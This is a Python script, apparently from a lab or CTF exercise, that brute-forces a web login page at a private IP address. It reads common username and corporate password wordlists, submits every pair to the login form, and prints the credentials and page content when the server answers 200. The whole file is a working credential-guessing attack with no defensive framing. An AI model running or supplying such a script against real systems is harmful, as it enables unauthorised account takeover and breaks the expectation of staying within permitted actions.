import requests

url = 'http://10.0.10.119'
username_list = []
password_list = []

with open("/usr/share/securelists/Usernames/top-usernames-shortlist.txt", "r") as username:
    line = username.readlines()
    username_list.append(line)
with open("/usr/share/securelists/Passwords/common_corporate_passwords.lst", "r") as password:
    line = password.readlines()
    password_list.append(line)

username_update_string = [username.rstrip('\n') for username in username_list[0]]
password_update_string = [password.rstrip('\n') for password in password_list[0]]

granted = False
len_username = 0

for u in username_update_string:
    for p in password_update_string:
        data = {"username":u, "password":p, "Войти":"sumbit"}
        response = requests.post(url, data)
        if response.status_code == 401:
            continue
        elif response.status_code == 200:
            print(f"Granted: {u}:{p}")
            print(response.text)
            granted = True
            break
    if granted:
        break
    len_username += 1
    if len_username == len(username_update_string):
        print("Not granted.")